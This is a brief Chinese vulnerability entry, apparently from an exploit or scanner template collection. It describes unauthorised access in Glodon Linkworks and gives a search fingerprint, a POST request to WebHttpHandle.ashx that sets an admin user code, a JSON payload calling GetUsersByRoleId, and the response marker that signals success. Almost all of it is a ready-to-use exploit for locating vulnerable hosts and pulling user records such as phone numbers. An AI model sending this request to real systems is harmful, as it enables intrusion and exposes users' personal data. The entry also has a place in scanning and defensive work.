# 广联达-Linkworkswebhttphandle未授权访问漏洞

广联达-Linkworkswebhttphandle ｜ 未授权访问 ｜ —
- **指纹**：`body="/Services/Identification/login.ashx"`
- **请求**：`POST /org/WebHttpHandle.ashx?FromNetCore=TRUE&UserID=0&UserCode=admin HTTP/1.1`

**Payload**
```
{"controller":"GTP.Org.Action.RoleCacheUserService","action":"GetUsersByRoleId","args":[1001]}
```
- **响应特征**：200 MobilePhone